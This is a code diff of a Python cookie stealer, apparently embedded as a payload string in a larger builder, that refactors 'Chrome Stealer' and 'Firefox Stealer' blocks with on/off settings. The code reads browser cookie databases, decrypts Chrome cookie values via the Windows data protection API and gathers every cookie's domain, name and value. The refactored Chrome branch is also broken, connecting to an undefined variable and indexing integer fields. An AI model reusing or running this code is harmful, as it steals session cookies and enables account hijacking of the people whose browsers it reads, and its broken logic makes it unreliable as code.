@@ -5,60 +5,65 @@ import sqlite3
 import win32crypt
 import glob
 
+
+####SETTINGS####
+chrome = 1          # 0 - off, 1 - on
+firefox = 1         # 0 - off, 1 - on
+####SETTINGS####
+
+
+
 cookies = {}
 
-# Chrome Stealer
-PathName = os.getenv('localappdata') + '\\Google\\Chrome\\User Data\\Default\\Cookies'
-connection = sqlite3.connect(PathName)
-sessions = []
-with connection:
-    cursor = connection.cursor()
-    v = cursor.execute('SELECT host_key,name,encrypted_value,creation_utc,expires_utc FROM cookies')
-    values = v.fetchall()
-    for info in values:
-        host = info[0]
-        name = info[1]
-        value = win32crypt.CryptUnprotectData(info[2], None, None, None, 0)[1]
-        creation = info[3],
-        expires = info[4],
-        payload = {
-                'domain': host,
-                'name': name,
-                'value': value,
-                'creation': creation[0],
-                'expires': expires[0],
-            }
-        sessions.append(payload)
-cookies['chrome'] = sessions
+if chrome:
+    # Chrome Stealer
+    chrome_cookie = glob.glob(os.getenv('localappdata') + '\\Google\\Chrome\\User Data\\Default\\Cookies')
+    if chrome_cookie:
+        chrome_cookie = chrome_cookie[0]
+        connection = sqlite3.connect(PathName)
+        sessions = []
+        with connection:
+            cursor = connection.cursor()
+            v = cursor.execute('SELECT host_key,name,encrypted_value,creation_utc,expires_utc FROM cookies')
+            values = v.fetchall()
+            for info in values:
+                payload = {
+                        'domain': info[0],
+                        'name': info[1],
+                        'value': win32crypt.CryptUnprotectData(info[2], None, None, None, 0)[1],
+                        'creation': info[3][0],
+                        'expires': info[4][0],
+                    }
+                sessions.append(payload)
+    else:
+        sessions = []
+    cookies['chrome'] = sessions
 
-# Firefox Stealer
-firefox_cookie = glob.glob(os.path.join(os.getenv('APPDATA', ''), 'Mozilla/Firefox/Profiles/*.default/cookies.sqlite'))
-if firefox_cookie:
-    firefox_cookie = firefox_cookie[0]
-    connection = sqlite3.connect(firefox_cookie)
-    sessions = []
-    with connection:
-        cursor = connection.cursor()
-        v = cursor.execute('SELECT host,name,value, creationTime, expiry, name FROM moz_cookies')
-        values = v.fetchall()
-        for info in values:
-            host = info[0]
-            name = info[1]
-            value = info[2]
-            creation = info[3]
-            expires = info[4]
-            payload = {
-                    'domain': host,
-                    'name': name,
-                    'value': value,
-                    'creation': creation,
-                    'expires': expires,
-                }
-            sessions.append(payload)
+if firefox:
+    # Firefox Stealer
+    firefox_cookie = glob.glob(os.path.join(os.getenv('APPDATA', ''), 'Mozilla/Firefox/Profiles/*.default/cookies.sqlite'))
+    if firefox_cookie:
+        firefox_cookie = firefox_cookie[0]
+        connection = sqlite3.connect(firefox_cookie)
+        sessions = []
+        with connection:
+            cursor = connection.cursor()
+            v = cursor.execute('SELECT host,name,value, creationTime, expiry, name FROM moz_cookies')
+            values = v.fetchall()
+            for info in values:
+                payload = {
+                        'domain': info[0],
+                        'name': info[1],
+                        'value': info[2],
+                        'creation': info[3],
+                        'expires': info[4],
+                    }
+                sessions.append(payload)
+    else:
+        sessions = []
+    cookies['firefox'] = sessions
 
-else:
-    sessions = []
-cookies['firefox'] = sessions
+
 mprint = str(cookies)
 """
 l_source = r"""
